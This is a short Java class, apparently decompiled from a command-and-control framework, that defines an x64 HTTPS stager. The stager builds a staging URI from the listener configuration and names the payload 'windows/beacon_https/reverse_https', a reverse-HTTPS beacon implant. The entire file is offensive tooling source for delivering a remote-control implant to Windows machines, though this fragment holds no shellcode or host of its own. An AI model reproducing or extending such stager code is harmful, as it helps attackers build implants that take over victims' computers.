package stagers;

import common.ScListener;

public class BeaconHTTPSStagerX64 extends GenericHTTPSStagerX64 {
   public BeaconHTTPSStagerX64(ScListener var1) {
      super(var1);
   }

   public String payload() {
      return "windows/beacon_https/reverse_https";
   }

   public String getURI() {
      String var10000 = this.getConfig().getURI_X64();
      return var10000 + this.getConfig().getQueryString();
   }
}
